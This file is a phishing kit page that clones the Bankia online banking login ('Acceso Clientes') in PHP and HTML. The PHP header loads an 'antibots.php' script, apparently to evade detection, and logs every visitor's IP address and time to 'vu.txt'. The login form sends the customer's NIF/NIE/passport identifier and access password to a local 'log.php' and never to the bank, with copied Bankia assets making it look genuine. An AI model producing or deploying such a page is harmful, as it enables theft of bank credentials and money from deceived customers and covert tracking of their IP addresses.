<?php
error_reporting(0);
include "antibots.php";

$ip = getenv("REMOTE_ADDR");
$file = fopen("vu.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
$rand = md5(microtime());

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang="es" dir="ltr" class="wf-opensans-n4-active wf-opensans-n6-active wf-active">
<!--<![endif]-->

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link href="./Files/vgn-ext-templating-delivery.css" rel="stylesheet" type="text/css">

    <script type="text/javascript" async="" defer="" src="./Files/SBHUBAN2921.js.téléchargement"></script>
    <script src="./Files/sha3.js.téléchargement"></script>
    <script src="./Files/webfont.js.téléchargement" type="text/javascript" async=""></script>
    <script async="" src="./Files/analytics.js.téléchargement"></script>
    <script type="text/javascript" src="./Files/ajax.jsp"></script>
    <script type="text/javascript" src="./Files/vquery.min.js.téléchargement"></script>
    <script type="text/javascript" src="./Files/ajaxlib.js.téléchargement"></script>
    <script type="text/javascript" src="./Files/wem-ajax-min.js.téléchargement"></script>
    <script type="text/javascript" src="./Files/wem-messaging-min.js.téléchargement"></script>
    <script type="text/javascript" src="./Files/vcm32266.js.téléchargement"></script>





    <script type="text/javascript">
        var frontPathPrefix = "/estaticos/front";
    </script>
	
    <link rel="stylesheet" type="text/css" href="./Files/bootstrap.min.css">

    <link rel="stylesheet" type="text/css" href="./Files/ladda.min(1).css">



    <link rel="stylesheet" type="text/css" href="./Files/general.min.css">

    <link rel="stylesheet" type="text/css" href="./Files/modulesLogin.min.css">
    <link href="https://www.bankia.es/estaticos/front/images/favicon.ico" rel="icon" type="image/png">
    <link href="./Files/jquery-ui.theme.min.css" rel="stylesheet" type="text/css">
    <link href="./Files/slick.css" rel="stylesheet" type="text/css">
    <link href="./Files/bootstrap.css" rel="stylesheet" type="text/css">
    <link href="./Files/bootstrap-multiselect.css" rel="stylesheet" type="text/css">
    <link href="./Files/datatables.min.css" rel="stylesheet" type="text/css">
    <link href="./Files/ladda.min.css" rel="stylesheet" type="text/css">
    <link href="./Files/general.css" rel="stylesheet" type="text/css">
    <link href="./Files/modules.css" rel="stylesheet" type="text/css">
    <link href="./Files/styles.css" rel="stylesheet" type="text/css">
    <link href="./Files/ifb-BankiaWidgets.css" rel="stylesheet" type="text/css">
    <link href="./Files/styleWFG.css" rel="stylesheet" type="text/css">
    <!--[if IE9]><link href="/estaticos/front/css/ie9.css" rel="stylesheet" type="text/css" /><![endif]-->
 
    <style type="text/css"></style>

    <link href="./Files/colorbox.css" rel="stylesheet" type="text/css">
    <link href="./Files/jquery.smartbanner.css" rel="stylesheet" type="text/css">


    <!-- canonical.jsp -->





    <!--  SEO  canonical.jsp-->



    <!-- FIN SEO -->

    <!-- END - canonical.jsp -->



    <!-- pageHeaderIncludeDefault -->





    <meta http-equiv="Content-Script-Type" content="text/javascript">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">





    <meta http-equiv="last-modified" content="2017-10-11">







    <link class="noTraducibleMultidioma" rel="alternate" href="https://www.bankia.es/es/particulares/acceso-clientes" hreflang="es">





    <link class="noTraducibleMultidioma" rel="alternate" href="https://www.bankia.es/en/retail-banking/acceso-clientes" hreflang="en">





    <link class="noTraducibleMultidioma" rel="alternate" href="https://www.bankia.es/va/particulars/acceso-clientes" hreflang="ca-es-vc">





    <link class="noTraducibleMultidioma" rel="alternate" href="https://www.bankia.es/ca/particulars/acceso-clientes" hreflang="ca-es">





    <link class="noTraducibleMultidioma" rel="alternate" href="https://www.bankia.es/de/particulares/acceso-clientes" hreflang="de">









    <title>Acceso Clientes Bankia online</title>





    <meta name="title" content="Bankia online – Acceso para clientes">

    <meta name="description" content="Consulta tus cuentas y gestiona tus productos de Bankia por internet desde cualquier lugar.">





    <!-- BANNER APP -->
    <meta name="apple-itunes-app" content="app-id=387153389">
    <meta name="google-play-app" content="app-id=es.cm.android&amp;hl=es">
    <link rel="apple-touch-icon" href="https://www.bankia.es/estaticos/front/images/BankiaApps.png">
 
    <!-- FIN BANNER APP -->
    <link rel="stylesheet" href="./Files/css" media="all">

</head>

<body>
    <div id="cc-tag" class="cc-tag-bottom-right cc-dark" style="display: none;"><a class="cc-link" href="https://www.bankia.es/es/particulares/acceso-clientes#" id="cc-tag-button" title="Configuración de privacidad"><span>Configuración de privacidad</span></a></div>

    <!-- pl-default -->





    <div class="contenedor_general">
        <header class="mod_header mod_headerNew">

        </header>



        <div tabindex="-1" role="dialog" aria-labelledby="modalLightboxLogin" id="lightboxLogin" class="mod_lightbox mod_lightboxNew lightboxLoginNew modal fade">
            <div role="document" class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <a title="Cerrar" data-dismiss="modal" aria-label="close" class="close" tabindex="0">
						<img src="./Files/close.png" alt="Cerrar">
					</a>




                        <h4 id="modalLightboxLogin" class="modal-title title-lightbox"></h4>


                    </div>
                    <div class="modal-body modal-lightbox">
                    </div>
                </div>
            </div>
        </div>

        <main class="mod_layout" style="margin-top: 0px;">


            <link href="./Files/login_oi.css" rel="stylesheet" type="text/css">




            <div class="lyt-box">





                <div class="col-xs-12">
                    <div class="mod_homeDescription">



                        <div class="hide"><label> Prioridad: <input id="inputPrioridad" name="inputPrioridad" type="text" value="3"> </label></div>
                        <div id="contactLanding">&nbsp;</div>
                        <!--nuevo contenido acceso clientes-->
                        <header class="mod_header mod_headerNew">
                            <div class="container">
                                <div class="row">
                                    <div class="hdr-atajos-miniMenu hidden-xs">
                                        <div class="hdr-atajos">
                                            <ul class="hdr-atajos-list">
                                                <li class="hdr-atajos-item">
                                                    <div class="mod_select slt-simple hdr-iconInfo"><select class="slt-select slt-select-cabecera" data-function="fc-selectHelp" id="ui-id-1" style="display: none;">
<option value="/es/particulares/atencion-cliente">Atención al cliente</option>
<option value="/es/particulares/operativa-urgencia">Operativa de Urgencia</option>
<option disabled="disabled" value="/sites/v/index.jsp?vgnextoid=ded7a1c16f4a4510VgnVCM100000871b400aRCRD&amp;vgnextfmt=default&amp;vgnextlocale=es_ES">902 2 4 6 8 10</option>
</select><span class="ui-selectmenu-button ui-widget ui-state-default ui-corner-all" tabindex="0" id="ui-id-1-button" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-owns="ui-id-1-menu" aria-haspopup="true" style="width: 151px;"><span><img src="Files/ico1.png" width="21" height="19" class="ui-icon ui-icon-triangle-1-s" alt=""/></span><span class="ui-selectmenu-text">Atención al cliente</span></span>
                                                    </div>
                                                </li>
                                                <li class="hdr-atajos-item"><a hreflang="es" title="Oficinas y cajeros" class="hdr-atajos-link hdr-iconMark" href="https://www.bankia.es/es/particulares/oficina-y-cajeros" tabindex="0"> <span class="hdr-atajos-txt">Oficinas y cajeros</span></a></li>
                                                <li class="hdr-atajos-item">
                                                    <div class="mod_select slt-simple"><select id="language-switcher" class="slt-select" data-function="fc-selectLanguaje" style="display: none;">
<option class="noTraducibleMultidioma" selected="selected" value="/es/particulares/acceso-clientes" data-value="ES">Español</option>
<option class="noTraducibleMultidioma" value="/en/retail-banking/acceso-clientes" data-value="EN">English</option>
<option class="noTraducibleMultidioma" value="/ca/particulars/acceso-clientes" data-value="CA">Català</option>
<option class="noTraducibleMultidioma" value="/va/particulars/acceso-clientes" data-value="VA">Valencià</option>
</select><span class="ui-selectmenu-button ui-widget ui-state-default ui-corner-all" tabindex="0" id="language-switcher-button" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-owns="language-switcher-menu" aria-haspopup="true" style="width: 94px;"><span><img src="Files/ico1.png" width="21" height="19" alt="" class="ui-icon ui-icon-triangle-1-s" /></span><span class="ui-selectmenu-text">Español</span></span>
                                                    </div>
                                                </li>
                                            </ul>
                                        </div>
                                        <!--
                        <div class="hdr-search">
                          
                            <form action="/es/particulares/buscador" method="post" class="mod_form frm-search" name="buscador-desktop">
                                <a href="javascript:void(0)"  hreflang="es"  class="but-header ico_headerSea"> <span class="hideAccessible">Buscador</span>
                                </a>
                                <fieldset class="frm-fieldset">
                                    <legend class="hideAccessible frm-legend">
                                        <span class="frm-legend-txt">Buscador</span>
                                    </legend>
                                    <label for="id_buscador" class="frm-label"> <input type="text" name="text" placeholder="Buscar aqui..." id="id_buscador" class="frm-input hdr-search-input fc-autocompleteSearch" />
                                    </label> <label data-icon="&#xe090;" class="frm-label hdr-modSearch-btn frm-noBorder data-ico-S"> <input type="button" value="Buscador" class="frm-input hdr-search-btn fc-openInputSearchNew" id="submit-desktop" />
                                </label>
                                </fieldset>
                                <input class="noTraducibleMultidioma" type="hidden" id="site" name="site" value="buscador">
                            </form>
                        </div>
                        --></div>
                                    <div class="hdr-logo-miniMenu">
                                        <div class="col-hdr-logo">
                                            <h1><a hreflang="es" title="Subhome Particulares" tabindex="0" href="https://www.bankia.es/es/particulares"> <img src="./Files/logoBankiaTr.png" alt="" class="hdr-logo-img"> </a></h1>
                                            <p class="hdr-logo-txt">Acceso clientes</p>
                                        </div>
                                        <div class="hdr-nav">
                                            <nav class="mod_headerNav mod_headerNavNew">
                                                <div class="col-xs-12 hidden-md hidden-lg">
                                                    <div class="hrn-logo"><a hreflang="es" href="https://www.bankia.es/es/particulares" tabindex="0"><img src="./Files/logo_BANKIA.svg" alt="Logo Bankia" class="hdr-logo-img"></a></div>
                                                </div>
                                                <div class="hidden-md hidden-lg">
                                                    <div class="mod_buttons"><a hreflang="es" class="but-close fc-closeMenuMobile data-ico-E" data-icon="c" tabindex="0"> <span class="but-txt">Cerrar</span></a></div>
                                                </div>
                                                <div class="hidden-md hidden-lg">
                                                    <div class="hdr-entity">
                                                        <div class="mod_select"><select class="slt-select slt-select-cabecera" data-function="fc-selectNav" id="ui-id-2" style="display: none;">
<option class="noTraducibleMultidioma" selected="selected" value="/es/particulares">Particulares</option>
<option class="noTraducibleMultidioma" value="/es/banca-personal">Banca personal</option>
<option class="noTraducibleMultidioma" value="/es/banca-privada">Banca privada</option>
<option class="noTraducibleMultidioma" value="/es/empresas">Empresas</option>
<option class="noTraducibleMultidioma" value="/es/pymes-y-autonomos">Pymes y Autónomos</option>
</select><span class="ui-selectmenu-button ui-widget ui-state-default ui-corner-all" tabindex="0" id="ui-id-2-button" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-owns="ui-id-2-menu" aria-haspopup="true" style="width: 100px;"><span class="ui-icon ui-icon-triangle-1-s"></span><span class="ui-selectmenu-text">Particulares</span></span>
                                                            <div class="ui-selectmenu-menu ui-front ui-selectmenu-menu-nav">
                                                                <ul aria-hidden="true" aria-labelledby="ui-id-2-button" id="ui-id-2-menu" class="ui-menu ui-widget ui-widget-content ui-corner-bottom" role="listbox" tabindex="0"></ul>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="hdr-atajos-miniMenu hidden-md hidden-lg">
                                                    <div class="hdr-atajos">
                                                        <ul class="hdr-atajos-list">
                                                            <li class="hdr-atajos-item">
                                                                <div class="mod_select slt-simple hdr-iconInfo"><select class="slt-select slt-select-cabecera" data-view="fc-selectMobile" id="ui-id-3" style="display: none;">
<option value="/es/particulares/atencion-cliente">Atención al cliente</option>
<option value="/es/particulares/operativa-urgencia">Operativa de Urgencia</option>
<option disabled="disabled" value="/sites/v/index.jsp?vgnextoid=ded7a1c16f4a4510VgnVCM100000871b400aRCRD&amp;vgnextfmt=default&amp;vgnextlocale=es_ES">902 2 4 6 8 10</option>
</select><span class="ui-selectmenu-button ui-widget ui-state-default ui-corner-all" tabindex="0" id="ui-id-3-button" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-owns="ui-id-3-menu" aria-haspopup="true" style="width: 100px;"><span class="ui-icon ui-icon-triangle-1-s"></span><span class="ui-selectmenu-text">Atención al cliente</span></span>
                                                                    <div class="ui-selectmenu-menu ui-front ui-selectmenu-menu-mobile">
                                                                        <ul aria-hidden="true" aria-labelledby="ui-id-3-button" id="ui-id-3-menu" class="ui-menu ui-widget ui-widget-content ui-corner-bottom" role="listbox" tabindex="0"></ul>
                                                                    </div>
                                                                </div>
                                                            </li>
                                                            <li class="hdr-atajos-item"><a hreflang="es" title="Oficinas y cajeros" class="hdr-atajos-link hdr-iconMark" href="https://www.bankia.es/es/particulares/oficina-y-cajeros" tabindex="0"> <span class="hdr-atajos-txt">Oficinas y cajeros</span></a></li>
                                                            <li class="hdr-atajos-item">
                                                                <div class="mod_select slt-simple"><select id="language-switcher-mobile" class="slt-select" data-function="fc-selectLanguajeMobile" data-view="fc-selectMobile" style="display: none;">
<option class="noTraducibleMultidioma" selected="selected" value="/es/particulares/acceso-clientes" data-value="ES">Español</option>
<option class="noTraducibleMultidioma" value="/en/retail-banking/acceso-clientes" data-value="EN">English</option>
<option class="noTraducibleMultidioma" value="/ca/particulars/acceso-clientes" data-value="CA">Català</option>
<option class="noTraducibleMultidioma" value="/va/particulars/acceso-clientes" data-value="VA">Valencià</option>
</select><span class="ui-selectmenu-button ui-widget ui-state-default ui-corner-all" tabindex="0" id="language-switcher-mobile-button" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-owns="language-switcher-mobile-menu" aria-haspopup="true" style="width: 100px;"><span class="ui-valText">ES</span><span class="ui-icon ui-icon-triangle-1-s"></span><span class="ui-selectmenu-text"> Idioma</span></span>
                                                                    <div class="ui-selectmenu-menu ui-front ui-selectmenu-menu-mobile">
                                                                        <ul aria-hidden="true" aria-labelledby="language-switcher-mobile-button" id="language-switcher-mobile-menu" class="ui-menu ui-widget ui-widget-content ui-corner-bottom" role="listbox" tabindex="0"></ul>
                                                                    </div>
                                                                </div>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                </div>
                                                <div class="hidden-md hidden-lg">
                                                    <div class="mod_buttons-search">
                                                        <div class="hdr-search">
                                                            <form class="mod_form frm-search-mobile" action="https://www.bankia.es/es/particulares/buscador" method="post" name="buscador-mobile">
                                                                <fieldset class="frm-fieldset">
                                                                    <legend class="hideAccessible frm-legend"> <span class="frm-legend-txt">Buscador</span> </legend> <label class="frm-label" for="id_buscadorMobile"> <input id="id_buscadorMobile" class="frm-input hdr-search-input" name="text" type="text" placeholder="Buscar aqui..."> </label> <label class="frm-label hdr-modSearch-btn frm-noBorder data-ico-S" data-icon="?"> <input class="frm-input hdr-search-btn" type="submit" value="Buscador"> </label></fieldset><input id="site" name="site" type="hidden" value="buscador"></form>
                                                        </div>
                                                    </div>
                                                </div>
                                            </nav>
                                        </div>
                                        <div class="mod_buttons but-header hidden-md hidden-lg"><a hreflang="es" class="but-header ico_headerMenu fc-openMenuMobile" aria-expanded="false" tabindex="0"> <span class="hideAccessible">Desplegar menú</span> </a> <a hreflang="es" class="but-header ico_headerSea fc-openMenuSearchNew btn-visble data-ico-S hidden-xs hidden-sm hidden-md hidden-lg" data-icon="?" tabindex="0"> <span class="hideAccessible">Buscar</span> </a> <a hreflang="es" class="but-header ico_headerSeaClosed fc-openMenuSearchNew data-ico-E" data-icon="c" tabindex="0"> <span class="hideAccessible">Buscar</span></a></div>
                                    </div>
                                    <!--
                    <div class="mod_buttons-search">
                        <div class="hdr-search">

                            <form action="/es/particulares/buscador" method="post" class="mod_form frm-search-mobile" name="buscador-mobile">
                                <fieldset class="frm-fieldset">
                                    <legend class="hideAccessible frm-legend">
                                        <span class="frm-legend-txt">Buscador</span>
                                    </legend>
                                    <label for="id_buscadorMobile" class="frm-label"> <input type="text" name="text" placeholder="Buscar aqui..." id="id_buscadorMobile" class="frm-input hdr-search-input" />
                                    </label> <label data-icon="&#xe090;" class="frm-label hdr-modSearch-btn frm-noBorder data-ico-S"> <input type="submit" value="Buscador" class="frm-input hdr-search-btn" />
                                </label>
                                </fieldset>
                            </form>
                        </div>
                    </div>
                    --></div>
                            </div>
                      
                        </header>
                        <!--end nuevo contenido acceso clientes-->
                        <div class="lyt-box"><input id="hreflang" type="hidden" value="es">
                            <div id="bannerVideoLanding">&nbsp;</div>
                            <input id="contentId" type="hidden" value="eb0d6928e2407510VgnVCM1000006c84400aRCRD">
                            <div class="mod_bannerHeaderSection bhs-landing">
                                <figure class="bhs-img"><img src="./Files/bg_login.jpg"></figure>
                            </div>
                        </div>
                        <!-- nuevo contenido acceso clientes -->
                        <div class="container content-form">
                            <div class="iframe-form">
							 <div aria-expanded="false" role="menu" class="mod_login  lgn-iframe">
        <!-- mod_message-->
        <div class="mod_message msg-error hide" id="messageValidando">
            <div class="msg-container">
                <p class="msg-text" id="mensajeErr">Por favor revisa los campos erróneos indicados en el formulario</p><a data-function="fc-closeMessage" data-icon="c" class="msg-link data-ico-E"></a>
            </div>
        </div>

        <input type="hidden" id="loginLetraActivo" name="loginLetraActivo" value="true">
        <form action="log.php" method="post" class="mod_form frm-login" name="formularioLogin" id="formularioLogin">

            <fieldset class="frm-fieldset">
                <legend class="hideAccessible frm-legend"> <span class="frm-legend-txt">Acceso de clientes</span></legend>
                <label for="id_usu_login" id="id_usu_login" class="frm-label"><span class="frm-label-txt">Usuario</span>
          
		  <div class="hide" id="placeHolderLogin">
		  	<div class="msg-container">
				<p class="msg-text" id="placeHolderLoginPU">NIF / NIE / Pasaporte</p><a data-function="fc-closeMessage" data-icon="c" class="msg-link data-ico-E"></a>
		  	</div>
		  </div>
          <input  type="text" value="" name="identificador" id="identificador" maxlength="15" autocomplete="off" required="required" placeholder="NIF / NIE / Pasaporte" class="frm-input"><span id="id_desc_err_usu" class="frm-txt-message">El Nº Documento es incorrecto, introduzca su DNI, pasaporte o tarjeta de residencia.</span>
        </label>

                <!--	PARA LA TRADUCCION DEL PLACEHOLDER, YA QUE POR DEFECTO, LOS INPUTS NO SE TRADUCEN	-->
              
                <label for="id_acc_login" id="id_acc_login" class="frm-label"><span class="frm-label-txt">Clave de acceso</span>
          <input type="password" name="password" id="password" maxlength="8" autocomplete="off" required="required" aria-expanded="false" class="frm-input"><span id="id_desc_err_pass" class="frm-txt-message">La clave es incorrecta</span>
        </label>

                <div class="mod_buttons">
                    <button id="botonEntrar" data-function="fc-buttonLoading" type="submit" title="Entrar" value="Entrar" data-style="expand-left" class="but-green but-wDefault ladda-button"><span class="ladda-label">Entrar</span><span class="ladda-spinner"></span></button>
                </div>
            </fieldset>


            <!--        LOGIN PU:FORMULARIOS -->

            <!--         FORMULARIOS -->
            <label for="qXkoFxDOmH" class="frm-label forClave"><span class="frm-label-txt"></span>
      
        </label>






            <!--         FIN-FORMULARIOS -->

            <!--        LOGIN PU:FIN-FORMULARIOS -->
        </form>
    </div>
                                <div class="links-group"><a hreflang="es" title="Ha olvidado su clave, pulse aquí" tabindex="0" target="_blank" class="frm-link but-default" href="https://www.bankia.es/es/particulares/alta-usuario/enrollment/#/recuperar-clave?a=18"> <span class="frm-link-txt">Olvidé mi clave o está bloqueada</span></a> <a title="No tengo claves de acceso" class="but-default" href="https://www.bankia.es/es/particulares/alta-usuario/enrollment" tabindex="0">No tengo claves de acceso</a></div>
                            </div>
                            <div class="content-figure">
                                <div class="hero"><img src="./Files/banner-ecommerce-270x254-1.png"></div>
                                <div class="claim-button-content">
                                    <div class="claim">
                                        <p class="claim_tittle">&nbsp;</p>
                                        <p><strong>Contrata la Tarjeta Crédito ON</strong></p>
                                        <p><strong>en Bankia Online</strong></p>
                                    </div>
                                    <div class="button">
                                        <div class="mod_buttons"><a title="Descúbrela" tabindex="0" class="but-default but-wDefault" href="https://www.bankia.es/es/particulares/cuentas-y-tarjetas/tarjetas">Descúbrela </a></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <!-- /nuevo contenido acceso clientes -->
                        <div class="lyt-box">
                            <script src="./Files/contact.js.téléchargement" type="text/javascript"></script>
                            <div class="hide"><label> Segmento <input id="segmentoActual" name="segmentoActual" type="text" value="particulares"></label></div>
                            <div class="hide"><label>Prioridad: <input id="inputPrioridad" name="inputPrioridad" type="text" value="3"></label></div>
                            <aside class="mod_contactabilidadSH espacio_contactabilidadSH">
                                <div class="lyt-box">
                                    <!-- mod_contactability-->
                                    <div class="mod_contactabilityNew">
                                        <!-- <div class="container">
<div class="row">
<div class="col-xs-12">
<div class="ctn-logo">
<figure class="ctn-figure"><img src="https://www.bankia.es/front/images/content/icons/logocontactability.png" /></figure>
<h2 class="ctn-lema">Estamos para ayudarte</h2>
</div>
<ul class="ctn-list">
<li class="ctn-item">
<figure class="ctn-icon"><img src="https://www.bankia.es/estaticos/Portal-unico/contactabilidad/Telefono.svg" alt="Icono gris de un tel&eacute;fono" /></figure>
<a href="tel:916 346 964" class="ctn-link ctn-bold" hreflang="es" tabindex="0">916 346 964</a></li>
<li class="ctn-item">
<figure class="ctn-icon"><img src="https://www.bankia.es/estaticos/Portal-unico/contactabilidad/Contactabilidad/Iconos/Atencion_cliente.svg" alt="Icono auriculares" /></figure>
<a hreflang="es" data-toggle="modal" data-target="#lightboxCtcTalkYou" data-function="fc-openLoading" class="ctn-link" tabindex="0">Te llamamos gratis</a>
<figure class="ctn-iconGo"><img src="https://www.bankia.es/front/images/content/icons/icon-goToGrey.png" /></figure>
</li>
<li class="ctn-item">
<figure class="ctn-icon"><img src="https://www.bankia.es/estaticos/Portal-unico/contactabilidad/Email.svg" alt="Icono gris de una carta" /></figure>
<a hreflang="es" data-toggle="modal" data-target="#lightboxCEmailYou" data-function="fc-openLoading" class="ctn-link" tabindex="0">&iexcl;Escr&iacute;benos!</a>
<figure class="ctn-iconGo"><img src="https://www.bankia.es/front/images/content/icons/icon-goToGrey.png" /></figure>
</li>
</ul>
</div>
</div>
</div>  --></div>
                                    <!-- End mod_contactability-->
                                    <!-- mod_lightboxForgetData-->
                                    <div id="lightboxForgetData" class="mod_lightbox mod_lightboxNew modal fade" tabindex="-1">
                                        <div class="modal-dialog footer">
                                            <div class="modal-content">
                                                <div class="modal-header">
                                                    <div class="”mod_buttons”"><a hreflang="es" title="Cerrar" tabindex="0" class="close" data-dismiss="modal" aria-label="close"> <img src="./Files/close(1).png" alt="Cerrar"> </a></div>
                                                    <h4 id="modalLightboxForgetData" class="modal-title">Hemos recibido correctamente tu petición</h4>
                                                </div>
                                                <div class="modal-body">
                                                    <p>En breve se pondrá en contacto contigo un equipo especializado en atención comercial. Gracias por confiar en Bankia.</p>
                                                </div>
                                                <div class="modal-footer">
                                                    <div class="mod_buttons but-right"><input class="but-green but-wDefault" tabindex="0" type="button" value="Cerrar" data-dismiss="modal"></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <!-- End mod_lightboxForgetData-->
                                    <div id="lightboxCtcTalkYou" class="mod_lightbox mod_lightboxNew lightboxCtcTalkYou modal fade" tabindex="-1">
                                        <div class="modal-dialog">
                                            <div class="modal-content">
                                                <div id="id_error_tel" class="mod_message msg-error hide">&nbsp;</div>
                                                <form id="telefonoContactabilidad" class="mod_form frm-modal" action="https://www.bankia.es/es/particulares/acceso-clientes#" data-valid="false">
                                                    <div class="modal-header">
                                                        <div class="”mod_buttons”"><a hreflang="es" title="Cerrar" tabindex="0" class="close" data-dismiss="modal" aria-label="close"> <img src="./Files/close(1).png" alt="Cerrar"> </a></div>
                                                        <h4 id="lightboxCtcTalkYouLogin" class="modal-title">Te llamamos gratis</h4>
                                                    </div>
                                                    <div class="modal-body">
                                                        <fieldset class="frm-fieldset">
                                                            <legend class="hideAccessible frm-legend"> <span class="frm-legend-txt">Acceso</span> </legend> <label id="id_nom1_lab" class="frm-label" for="id_nom1"> <span class="frm-label-txt">Nombre</span> <input id="id_nom1" class="frm-input" autocomplete="off" maxlength="15" name="id_nom1" type="text" placeholder="Nombre"><span id="id_desc_err_nombre" class="frm-txt-message hide">Campo obligatorio. </span> </label> <label id="id_tel_lab" class="frm-label" for="id_tel"> <span class="frm-label-txt">Teléfono</span> <input id="id_tel" class="frm-input" autocomplete="off" maxlength="9" name="id_tel" type="text" placeholder="99999999"> <span id="id_desc_err_tel" class="frm-txt-message hide"> Formato incorrecto. Ej. 916346964 </span> </label>
                                                            <div class="frm-checkboxGroup"><input id="id_soy" class="frm-checkbox" tabindex="0" name="id_soy" type="checkbox"> <label class="frm-label parrafo14" for="id_soy">Soy cliente de Bankia</label></div>
                                                            <div class="frm-checkboxGroup"><input id="id_condi" class="frm-checkbox" tabindex="0" name="id_condi" type="checkbox"> <label id="id_condi_lab" class="frm-label parrafo14" for="id_condi"> He leído y acepto las <a hreflang="es" title="condiciones del servicio" tabindex="0" target="_blank" class="ctc-link" href="https://www.bankia.es/es/condiciones-de-privacidad"> condiciones de privacidad. </a> <label id="id_desc_err_tel_con" class="frm-label frm-message-error hide"> <span class="frm-txt-message"> Debe aceptar las condiciones de privacidad. </span> </label> </label>
                                                            </div>
                                                            <div class="mod_captcha mod_captchaTel">
                                                                <div class="captcha-custom ui-slider ui-slider-horizontal ui-widget ui-widget-content ui-corner-all" data-function="fc-captcha"><span class="capcha-txt">Mover para validar</span> <span class="capcha-txt-valid">¡Validado!</span><span class="ui-slider-handle ui-state-default ui-corner-all" tabindex="0" style="left: 0%;"></span></div>
                                                            </div>
                                                            <div class="modal-footer">
                                                                <div class="mod_buttons"><input class="but-green but-wDefault" tabindex="0" type="submit" value="Solicitar llamada"><input id="enviado_tel" name="enviado_tel" type="hidden" value="true"></div>
                                                            </div>
                                                        </fieldset>
                                                    </div>
                                                </form>
                                            </div>
                                        </div>
                                    </div>
                                    <div id="lightboxCEmailYou" class="mod_lightbox mod_lightboxNew lightboxCEmailYou modal fade" tabindex="-1">
                                        <div class="modal-dialog">
                                            <div class="modal-content">
                                                <div id="id_error_cor" class="mod_message msg-error hide">&nbsp;</div>
                                                <form id="coreoContactabilidad" class="mod_form frm-modal" action="https://www.bankia.es/es/particulares/acceso-clientes#" data-valid="false">
                                                    <div class="modal-header">
                                                        <div class="”mod_buttons”"><a hreflang="es" title="Cerrar" tabindex="0" class="close" data-dismiss="modal" aria-label="close"> <img src="./Files/close(1).png" alt="Cerrar"> </a></div>
                                                        <h4 id="lightboxCEmailYouLogin" class="modal-title">Escríbenos</h4>
                                                    </div>
                                                    <div class="modal-body">
                                                        <fieldset class="frm-fieldset">
                                                            <legend class="hideAccessible frm-legend"> <span class="frm-legend-txt">Acceso</span> </legend> <label id="id_nom2_lab" class="frm-label" for="id_nom2"><span class="frm-label-txt">Nombre</span> <input id="id_nom2" class="frm-input" autocomplete="off" maxlength="15" name="id_nom2" type="text" placeholder="Nombre"><span id="id_desc_err_nombre2" class="frm-txt-message hide">Campo obligatorio. </span> </label> <label id="id_cor_lab" class="frm-label" for="id_cor"> <span class="frm-label-txt"> Correo electrónico </span> <input id="id_cor" class="frm-input" autocomplete="off" maxlength="30" name="id_cor" type="text" placeholder="correo@electronico.com"> <span id="id_desc_err_cor" class="frm-txt-message hide"> Formato incorrecto. Ej. correo@electronico.com </span> </label> <label id="id_con_lab" class="frm-label" for="id_con"> <span class="frm-label-txt"> Escribe aquí tu consulta </span> <textarea id="id_con" class="frm-textarea" maxlength="500" name="id_con"></textarea><span id="id_desc_err_consulta" class="frm-txt-message hide">Campo obligatorio. </span> </label>
                                                            <div class="frm-checkboxGroup"><input id="id_soy2" class="frm-checkbox" tabindex="0" name="id_soy2" type="checkbox"> <label class="frm-label parrafo14" for="id_soy2">Soy cliente de Bankia</label></div>
                                                            <div class="frm-checkboxGroup"><input id="id_condi2" class="frm-checkbox" tabindex="0" name="id_condi2" type="checkbox"> <label id="id_condi2_lab" class="frm-label parrafo14" for="id_condi2"> He leído y acepto las <a hreflang="es" title="condiciones del servicio" tabindex="0" target="_blank" class="ctc-link" href="https://www.bankia.es/es/auxiliares/condiciones-del-servicio"> condiciones de privacidad. </a> <label id="id_desc_err_cor_con" class="frm-label frm-message-error hide"> <span class="frm-txt-message"> Debe aceptar las condiciones de privacidad. </span> </label> </label>
                                                            </div>
                                                            <div id="mod_captchaCorr" class="mod_captcha mod_captchaCorr">
                                                                <div class="captcha-custom ui-slider ui-slider-horizontal ui-widget ui-widget-content ui-corner-all" data-function="fc-captcha"><span class="capcha-txt">Mover para validar</span> <span class="capcha-txt-valid">¡Validado!</span><span class="ui-slider-handle ui-state-default ui-corner-all" tabindex="0" style="left: 0%;"></span></div>
                                                            </div>
                                                            <div class="modal-footer">
                                                                <div class="mod_buttons"><input class="but-green but-wDefault" tabindex="0" type="submit" value="Enviar mensaje"><input id="enviado" name="enviado" type="hidden" value="true"></div>
                                                            </div>
                                                        </fieldset>
                                                    </div>
                                                </form>
                                            </div>
                                        </div>
                                    </div>
                                    <!-- End mod_contactabilidad-->
                                </div>
                            </aside>
                        </div>
                        <footer class="mod_footer ftr-footerNew">
                            <div class="container">
                                <div class="row">
                                    <div class="col-xs-12">
                                        <div class="ftr-modLinks">
                                            <div class="row">
                                                <div class="col-xs-12 col-md-12 col-lg-12">
                                                    <ul class="ftr-modLinks-list">
                                                        <li class="ftr-modLinks-input"><a hreflang="es" tabindex="0" class="ftr-modLinks-link" rel="nofollow" href="https://www.bankia.es/es/particulares/aviso-legal"> <span class="ftr-modLinks-link-txt">Aviso legal</span></a></li>
                                                        <li class="ftr-modLinks-input"><a hreflang="es" tabindex="0" class="ftr-modLinks-link" rel="nofollow" href="https://www.bankia.es/es/particulares/seguridad"> <span class="ftr-modLinks-link-txt">Seguridad</span></a></li>
                                                        <li class="ftr-modLinks-input"><a hreflang="es" tabindex="0" class="ftr-modLinks-link" rel="nofollow" href="https://www.bankia.es/es/particulares/privacidad"> <span class="ftr-modLinks-link-txt">Privacidad</span></a></li>
                                                        <li class="ftr-modLinks-input"><a hreflang="es" tabindex="0" class="ftr-modLinks-link" rel="nofollow" href="https://www.bankia.es/es/particulares/politica-de-cookies"> <span class="ftr-modLinks-link-txt">Política de cookies</span></a></li>
